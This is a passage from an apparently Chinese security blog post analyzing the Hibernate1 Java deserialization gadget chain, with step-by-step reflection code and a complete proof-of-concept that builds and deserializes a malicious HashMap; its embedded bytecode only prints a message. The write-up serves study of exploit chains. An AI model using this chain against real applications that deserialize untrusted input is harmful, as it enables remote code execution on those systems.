<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803154222691.png" alt="image-20210803154222691"></p>
<h4 id="如何构造TemplatesImpl对象并完成调用？"><a href="#如何构造TemplatesImpl对象并完成调用？" class="headerlink" title="如何构造TemplatesImpl对象并完成调用？"></a>如何构造TemplatesImpl对象并完成调用？</h4><p>​            上面我们已经动态构造好了需要执行的类并得到了该类的字节码，下面我们只要构造好TemplatesImpl对象并调用getOutputProperties即可完成利用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">String clazzName = <span class="string">"test666"</span>;</span><br><span class="line">CtClass targetClass = pool.makeClass(clazzName);</span><br><span class="line">targetClass.setSuperclass(pool.get(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>));</span><br><span class="line">CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[] &#123;&#125;, targetClass);</span><br><span class="line">cons.setBody(<span class="string">"&#123;System.out.println(\"Hello World!!!\");&#125;"</span>);</span><br><span class="line">targetClass.addConstructor(cons);</span><br><span class="line"><span class="keyword">byte</span>[] byteArray = targetClass.toBytecode();</span><br><span class="line"><span class="keyword">byte</span>[][] b= &#123;byteArray&#125;;</span><br><span class="line">Class&lt;TemplatesImpl&gt; clazz = (Class&lt;TemplatesImpl&gt;) Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">Constructor&lt;TemplatesImpl&gt; con =  clazz.getDeclaredConstructor(<span class="keyword">byte</span>[][]<span class="class">.<span class="keyword">class</span>,<span class="title">String</span>.<span class="title">class</span>, <span class="title">Properties</span>.<span class="title">class</span>,<span class="title">int</span>.<span class="title">class</span>, <span class="title">TransformerFactoryImpl</span>.<span class="title">class</span>)</span>;</span><br><span class="line">con.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Properties pro=<span class="keyword">new</span> Properties();</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">2</span>;</span><br><span class="line">TemplatesImpl impl=  con.newInstance(b,<span class="string">"xxx"</span>,pro,a,TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line">Method method=clazz.getMethod(<span class="string">"getOutputProperties"</span>);</span><br><span class="line">method.invoke(impl);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803154552018.png" alt="image-20210803154552018"></p>
<p>​        通过上面的分析，我们已经完成了从invoke到任意代码执行的利用，接下来我们需要构造如何从readObject调用到invoke方法。</p>
<h4 id="如何构造对象从readObject到invoke"><a href="#如何构造对象从readObject到invoke" class="headerlink" title="如何构造对象从readObject到invoke?"></a>如何构造对象从readObject到invoke?</h4><p><strong>BasicGetter构造</strong></p>
<p>​        我们从invoke往上推，我们知道<code>org.hibernate.property.BasicPropertyAccessor.BasicGetter#get</code>中调用了invoke方法，再到上层调用getPropertyValue时，我们需要让this.getters中的内容为BasicGetter，并且component的内容为我们构造好的TemplatesImpl对象。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803160011764.png" alt="image-20210803160011764"></p>
<p>​        所以首先构造BasicGetter对象，由于BasicGetter只有private的构造方法，所以只能通过反射调用构造方法得到BasicGetter对象。另外根据之前的分析通过clazz和propertyName属性来动态构造的method属性，所以clazz属性要传入TemplatesImpl的Class，propertyName传入getOutputProperties。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803160435736.png" alt="image-20210803160435736"></p>
<p>​        所以得到了如下代码段。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;BasicPropertyAccessor.BasicGetter&gt; clazz2 = (Class&lt;BasicPropertyAccessor.BasicGetter&gt;) Class.forName(<span class="string">"org.hibernate.property.BasicPropertyAccessor$BasicGetter"</span>);</span><br><span class="line">      Constructor&lt;BasicPropertyAccessor.BasicGetter&gt; con2 =  clazz2.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Method</span>.<span class="title">class</span>,<span class="title">String</span>.<span class="title">class</span>)</span>;</span><br><span class="line">      con2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      BasicPropertyAccessor.BasicGetter getter= con2.newInstance(clazz,method,<span class="string">"OutputProperties"</span>);</span><br></pre></td></tr></table></figure>

<p>​        可以直接通过调用get方法来排错。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803162001005.png" alt="image-20210803162001005"></p>
<p><strong>构造PojoComponentTuplizer对象</strong></p>
<p>​        得到BasicGetter对象后，要将BasicGetter的内容赋值到AbstractComponentTuplizer的getters属性中，在AbstractComponentTuplizer。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803162804724.png" alt="image-20210803162804724"></p>
<p>​        AbstractComponentTuplizer是抽象类，不能创建对象，可以通过其子类来构建。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803163344843.png" alt="image-20210803163344843"></p>
<p>​        我们可以先创建一个PojoComponentTuplizer的实例，再通过反射修改getters字段的内容。但是使用这种方式我们需要构造一个Component对象，这个对象构造起来比较麻烦，参考ysoserial的实现，是通过reflectionFactory 在不调用构造方法的情况下创建对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;PojoComponentTuplizer&gt; clazz3 = (Class&lt;PojoComponentTuplizer&gt;) Class.forName(<span class="string">"org.hibernate.tuple.component.PojoComponentTuplizer"</span>);</span><br><span class="line">Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz3,  Object.class.getConstructor(new Class[0]));</span><br><span class="line">PojoComponentTuplizer pojo= (PojoComponentTuplizer) sc.newInstance(<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<p>​        下面通过反射修改getters属性的内容</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;AbstractComponentTuplizer&gt; clazz4 = (Class&lt;AbstractComponentTuplizer&gt;) Class.forName(<span class="string">"org.hibernate.tuple.component.AbstractComponentTuplizer"</span>);</span><br><span class="line">       Field getters=clazz4.getDeclaredField(<span class="string">"getters"</span>);</span><br><span class="line">       getters.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       BasicPropertyAccessor.BasicGetter[] gets=&#123;getter&#125;;</span><br><span class="line">       getters.set(pojo,gets);</span><br></pre></td></tr></table></figure>

<p>​        可以通过调用<code>pojo.getPropertyValue(impl,0);</code>测试是否设置成功。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803192512488.png" alt="image-20210803192512488"></p>
<p><strong>ComponentType构造</strong></p>
<p>​        继续看后面对象的构造，主要是利用了getHashCode方法。想要调用到PojoComponentTuplizer对象，需要让<code>this.propertyTypes[i]</code>的值为PojoComponentTuplizer对象,但是propertyTypes是一个Type类型的数组，而我们想要传的PojoComponentTuplizer并不是Type类型，所以不能通过<code>this.propertyTypes[i]</code>传递PojoComponentTuplizer对象。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803193257798.png" alt="image-20210803193257798"></p>
<p>​        在<code>org.hibernate.type.ComponentType#getPropertyValue(java.lang.Object, int)</code>中，存在如下调用，这里当component不为Object数组时，会调用<code>this.componentTuplizer.getPropertyValue(component, i);</code>，而componentTuplizer是ComponentTuplizer类型，PojoComponentTuplizer间接实现了该接口，所以是可以在这里传入PojoComponentTuplizer对象的。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803195829312.png" alt="image-20210803195829312"></p>
<p>​        另外i的内容由属性propertySpan控制，给这个属性赋值即可。</p>
<p>​        接下来要先构造ComponentType对象，这个对象的构造方法同样需要多个参数，不是很好构造，所以也可以通过reflectionFactory来进行构造。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803193736390.png" alt="image-20210803193736390"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;ComponentType&gt; CompType = (Class&lt;ComponentType&gt;) Class.forName(<span class="string">"org.hibernate.type.ComponentType"</span>);</span><br><span class="line">Constructor&lt;?&gt; sc2 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(CompType,  Object.class.getConstructor(new Class[0]));</span><br><span class="line">ComponentType comp= (ComponentType) sc2.newInstance(<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<p>​        下面只要通过反射给相应的字段赋值即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Field compTuplizer=CompType.getDeclaredField(<span class="string">"componentTuplizer"</span>);</span><br><span class="line">        compTuplizer.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        compTuplizer.set(comp,pojo);</span><br><span class="line">        Field propSpan=CompType.getDeclaredField(<span class="string">"propertySpan"</span>);</span><br><span class="line">        propSpan.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        propSpan.set(comp,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>​        可以通过<code>comp.getHashCode(impl);</code>来测试是否成功。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803213216204.png" alt="image-20210803213216204"></p>
<p><strong>TypedValue构造</strong></p>
<p>​        在<code>initTransients</code>中调用了getHashCode方法，所以只要将type赋值为我们构造好的ComponentType对象，value赋值为templateImpl对象即可。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803213335853.png" alt="image-20210803213335853"></p>
<p>​        所以最后一步为<code>TypedValue vaule=new TypedValue(comp,impl);</code></p>
<h4 id="为什么不直接构造TypedValue进行反序列化？"><a href="#为什么不直接构造TypedValue进行反序列化？" class="headerlink" title="为什么不直接构造TypedValue进行反序列化？"></a>为什么不直接构造TypedValue进行反序列化？</h4><p>​        经过我们的分析其实在TypedValue中的readObject方法就已经可以将整条链穿起来了，但实际上ysoserial并没有这么做，参考网上其他师傅的分析文章，也没有讲原因。我自己先构造TypeValue进行测试，发现虽然确实可以到initTransients方法中，但是并不会执行匿名内部类中的方法。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803224610712.png" alt="image-20210803224610712"></p>
<pre><code>请教了公司的大佬是因为直接调用initTransients方法时，其目的只是给this.hashcode做一个方法的声明，并不会调用内部类中的initialize方法，只有在hashcode初始化时，才会调用内部类的方法。所以要看哪里使用了this.hashcode。</code></pre><p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804092537770.png" alt="image-20210804092537770"></p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804092623949.png" alt="image-20210804092623949"></p>
<p>​        所以这就是不能直接构造TypedValue对象进行反序列化利用的原因。但我们要继续构造，需要构造一个ValueHolder对象，给value的属性值赋值为null，给<code>this.valueInitializer</code>赋值为我们构造好的typevalue。ValueHolder可以直接通过构造方法构造并给valueInitializer赋值。直接new即可<code>ValueHolder hod= new ValueHolder(vaule);</code></p>
<p>​        得到ValueHolder后，还需要将ValueHolder的内容赋给TypeValue的hashcode属性。所以要再构建一个TypeValue对象并给hashcode赋值。由于TypeValue不能直接通过构造方法给hashcode赋值，所以我们还是通过ReflectionFactory先得到TypeValue对象，再通过反射给hashcode属性赋值。</p>
<p>​        但是实际调用会有一些问题，当我们直接通过new创建ValueHolder对象时，并不会调用上面的方法，因为参数需要的是实现了DeferedInitializer接口的类。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804095959564.png" alt="image-20210804095959564"></p>
<p>​        所以使用下面的方式可以创建一个ValueHolder对象，initTransients再反序列化时会被调用，因此不用我们手动去创建ValueHolder对象。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804100326653.png" alt="image-20210804100326653"></p>
<p>​        所以其实没有那么麻烦，直接调用TypeValue的hashcode就可以将利用链倒上去。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804100657981.png" alt="image-20210804100657981"></p>
<p>​        下面分析怎么调到hashCode方法。我们回想下urldns利用链，最终就导向了URL.hashCode()，调用链如下。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804100855535.png" alt="image-20210804100855535"></p>
<p>​        先看看<code>java.util.HashMap#hash</code>，想要调用成功，我们需要让key的值为TypedValue。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804101049350.png" alt="image-20210804101049350"></p>
<p>​        下面时给key赋值，通过put方法即可。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804101552787.png" alt="image-20210804101552787"></p>
<p>​        最后我们看下HashMap的readObject方法，实际上时调用hash方法触发漏洞的。所以只要给HashMap一个key即可。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804102729512.png" alt="image-20210804102729512"></p>
<p>​        但不能直接通过put方法给key赋值，因为put本身就会调用hash方法并执行代码。所以可以通过hashcode的内部类Node的构造方法给key赋值。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804105725280.png" alt="image-20210804105725280"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class clazz5 = Class.forName(<span class="string">"java.util.HashMap$Node"</span>);</span><br><span class="line">       Constructor nodeCons = clazz.getDeclaredConstructor(<span class="keyword">int</span><span class="class">.<span class="keyword">class</span>, <span class="title">Object</span>.<span class="title">class</span>, <span class="title">Object</span>.<span class="title">class</span>, <span class="title">clazz5</span>)</span>;</span><br><span class="line">       nodeCons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       nodeCons.newInstance(<span class="number">2</span>,value,value,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>​        下面我们要将构造好的Node对象赋值给HashMap的某个属性即可，好像只有table属性接收Node对象，但table是transient修饰的，也就是说默认不会进行序列化这个字段。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804111256075.png" alt="image-20210804111256075"></p>
<p>​        但在writeObject中调用的internalWriteEntries中会遍历table并将其中的key和value进行序列化。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804111354621.png" alt="image-20210804111354621"></p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804111502423.png" alt="image-20210804111502423"></p>
<p>​        由于table需要的是Node的数组类型，因此还需要创建一个数组对Node进行封装。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Object tbl = Array.newInstance(clazz5,<span class="number">1</span>);</span><br><span class="line">Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">2</span>,value,value,<span class="keyword">null</span>));</span><br><span class="line">Field key=map.getClass().getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">key.set(map,tbl);</span><br></pre></td></tr></table></figure>

<p>​        但是这么做反序列化会有异常，因为我们没有给hashmap设置长度。所以还要给hashmap设置size属性。这个我就直接调用ysoserial自带的Reflections来进行设置了。<code>Reflections.setFieldValue(map, &quot;size&quot;, 1);</code>.</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804113152095.png" alt="image-20210804113152095"></p>
<p>​        总体的测试代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.weaver.ast.Test;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.engine.spi.TypedValue;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.internal.util.ValueHolder;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.mapping.Component;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.property.BasicPropertyAccessor;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.tuple.component.AbstractComponentTuplizer;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.tuple.component.PojoComponentTuplizer;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.type.ComponentType;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TempImplTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        String clazzName = <span class="string">"test666"</span>;</span><br><span class="line">        CtClass targetClass = pool.makeClass(clazzName);</span><br><span class="line">        targetClass.setSuperclass(pool.get(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>));</span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[] &#123;&#125;, targetClass);</span><br><span class="line">        cons.setBody(<span class="string">"&#123;System.out.println(\"Hello World!!!\");&#125;"</span>);</span><br><span class="line">        targetClass.addConstructor(cons);</span><br><span class="line">        <span class="keyword">byte</span>[] byteArray = targetClass.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] b= &#123;byteArray&#125;;</span><br><span class="line">        Class&lt;TemplatesImpl&gt; clazz = (Class&lt;TemplatesImpl&gt;) Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">        Constructor&lt;TemplatesImpl&gt; con =  clazz.getDeclaredConstructor(<span class="keyword">byte</span>[][]<span class="class">.<span class="keyword">class</span>,<span class="title">String</span>.<span class="title">class</span>, <span class="title">Properties</span>.<span class="title">class</span>,<span class="title">int</span>.<span class="title">class</span>, <span class="title">TransformerFactoryImpl</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        con.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Properties pro=<span class="keyword">new</span> Properties();</span><br><span class="line">        Method method=clazz.getMethod(<span class="string">"getOutputProperties"</span>);</span><br><span class="line">        <span class="keyword">int</span> a=<span class="number">2</span>;</span><br><span class="line">        TemplatesImpl impl=  con.newInstance(b,<span class="string">"xxx"</span>,pro,a,TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">        Class&lt;BasicPropertyAccessor.BasicGetter&gt; clazz2 = (Class&lt;BasicPropertyAccessor.BasicGetter&gt;) Class.forName(<span class="string">"org.hibernate.property.BasicPropertyAccessor$BasicGetter"</span>);</span><br><span class="line">        Constructor&lt;BasicPropertyAccessor.BasicGetter&gt; con2 =  clazz2.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Method</span>.<span class="title">class</span>,<span class="title">String</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        con2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        BasicPropertyAccessor.BasicGetter getter= con2.newInstance(clazz,method,<span class="string">"OutputProperties"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        getter.get(impl);</span></span><br><span class="line"></span><br><span class="line">        Class&lt;PojoComponentTuplizer&gt; clazz3 = (Class&lt;PojoComponentTuplizer&gt;) Class.forName(<span class="string">"org.hibernate.tuple.component.PojoComponentTuplizer"</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz3,  Object.class.getConstructor(new Class[0]));</span><br><span class="line">        PojoComponentTuplizer pojo= (PojoComponentTuplizer) sc.newInstance(<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">        Class&lt;AbstractComponentTuplizer&gt; clazz4 = (Class&lt;AbstractComponentTuplizer&gt;) Class.forName(<span class="string">"org.hibernate.tuple.component.AbstractComponentTuplizer"</span>);</span><br><span class="line">        Field getters=clazz4.getDeclaredField(<span class="string">"getters"</span>);</span><br><span class="line">        getters.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        BasicPropertyAccessor.BasicGetter[] gets=&#123;getter&#125;;</span><br><span class="line">        getters.set(pojo,gets);</span><br><span class="line"><span class="comment">//        pojo.getPropertyValue(impl,0);</span></span><br><span class="line">        Class&lt;ComponentType&gt; CompType = (Class&lt;ComponentType&gt;) Class.forName(<span class="string">"org.hibernate.type.ComponentType"</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc2 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(CompType,  Object.class.getConstructor(new Class[0]));</span><br><span class="line">        ComponentType comp= (ComponentType) sc2.newInstance(<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">        Field compTuplizer=CompType.getDeclaredField(<span class="string">"componentTuplizer"</span>);</span><br><span class="line">        compTuplizer.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        compTuplizer.set(comp,pojo);</span><br><span class="line">        Field propSpan=CompType.getDeclaredField(<span class="string">"propertySpan"</span>);</span><br><span class="line">        propSpan.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        propSpan.set(comp,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//        comp.getHashCode(impl);</span></span><br><span class="line">        TypedValue value=<span class="keyword">new</span> TypedValue(comp,impl);</span><br><span class="line"><span class="comment">//        vaule.hashCode();</span></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Reflections.setFieldValue(map, <span class="string">"size"</span>, <span class="number">1</span>);</span><br><span class="line">        Class clazz5 = Class.forName(<span class="string">"java.util.HashMap$Node"</span>);</span><br><span class="line">        Constructor nodeCons = clazz5.getDeclaredConstructor(<span class="keyword">int</span><span class="class">.<span class="keyword">class</span>, <span class="title">Object</span>.<span class="title">class</span>, <span class="title">Object</span>.<span class="title">class</span>, <span class="title">clazz5</span>)</span>;</span><br><span class="line">        nodeCons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object tbl = Array.newInstance(clazz5,<span class="number">1</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">2</span>,value,value,<span class="keyword">null</span>));</span><br><span class="line">        Field key=map.getClass().getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">        key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        key.set(map,tbl);</span><br><span class="line"></span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> FileOutputStream(<span class="string">"d:\\test.ser"</span>);</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(map);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"d:\\test.ser"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        这个利用链是我第一次尝试去自己构造exp的链，从中也学到了很多东西，相信下次再分析其他利用链会更加容易理解吧。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/" class="post-title-link" itemprop="url">从JNDI注入到内存马植入</a>
        </h1>

        <div class="post-meta">
